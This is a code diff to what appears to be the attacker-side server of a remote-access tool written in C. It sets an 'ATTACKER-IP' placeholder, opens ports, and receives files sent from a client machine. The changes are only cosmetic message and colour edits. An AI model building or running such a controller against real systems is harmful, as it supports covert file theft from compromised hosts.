@@ -12,7 +12,6 @@
 #include <pthread.h>
 
 char *ServerIP = "ATTACKER-IP"; //CHANGE THIS
-
 unsigned short ServerPort = 50000;
 unsigned short ServerTransferPort = 49500;
 
@@ -88,19 +87,20 @@ printf("\n");
 
 void SigInter(int Sig)
 {
-	printf("\nCaught SIGINT (CTRL+C). Are you sure you want to exit? Yes: Y/y | No: N/n\n");
-	printf("If you press Y/y, the client will still be under execution...\n");
-	printf("If you want the Client to also terminate correctly, send 'q' using the cli...\n");
+	printf("\nCaught SIGINT (CTRL+C)\n");
+	printf("If you want the Client to also terminate, press a key different to Y/y, and then send 'q' using the cli\n");
+	printf("If you press Y/y, the client process will remain open.\n");
+	printf("Are you sure you want to exit? Yes: Y/y | No: N/n : \n");
 	scanf("%1s", Resp);
 
 	if (Resp[0] == 'Y' || Resp[0] == 'y')
 	{
-		printf("Quitting.\n");
+		printf("\033[0;35m[+] Quitting.\033[0m\n");
 		exit(0);
 	}
 	else
 	{
-		printf("Not quitting. Press [ENTER]\n");
+		printf("\033[0;35m[+] Not quitting. Press [ENTER]\033[0m\n");
 		return;
 	}
 }
@@ -135,7 +135,7 @@ void* ReceiveFileFromClient()
 	ClientSocket2 = accept(filefd, (struct sockaddr *) &CAddr, &ClientLength2);
 	if (ClientSocket2 < 0)
 	{
-		printf("Error in accept\n");
+		printf("\033[1;31m[-] Error in accept!\033[0m\n");
 	}
 
 	read(ClientSocket2, FileName, sizeof(FileName));
@@ -144,7 +144,7 @@ void* ReceiveFileFromClient()
 	FILE *fp = fopen(FileName, "wb");
 	if (fp == NULL)
 	{
-		printf("Error opening file to write.\n");
+		printf("\033[1;31m[-] Error opening file to write.\033[0m\n");
 		close(ClientSocket2);
 		close(filefd);
 		return NULL;
@@ -157,10 +157,10 @@ void* ReceiveFileFromClient()
 
 	if (BytesReceived < 0)
 	{
-		printf("Error receiving data.\n");
+		printf("\033[1;31m[-] Error receiving data.\033[0m\n");
 	}
 
-	printf("File received successfully. Press [ENTER] to continue.\n");
+	printf("\033[0;35m[+] File received successfully. Press [ENTER] to continue.\033[0m\n");
 
 	fclose(fp);
 	close(ClientSocket2);
@@ -191,7 +191,7 @@ int main(int argc, char *argv[])
 
 	else
 	{
-		printf("Invalid argument. Please use 'help' or 'start'...\n");
+		printf("Invalid argument. Please use 'menu' or 'start'...\n");
 		return 0;
 	}
 
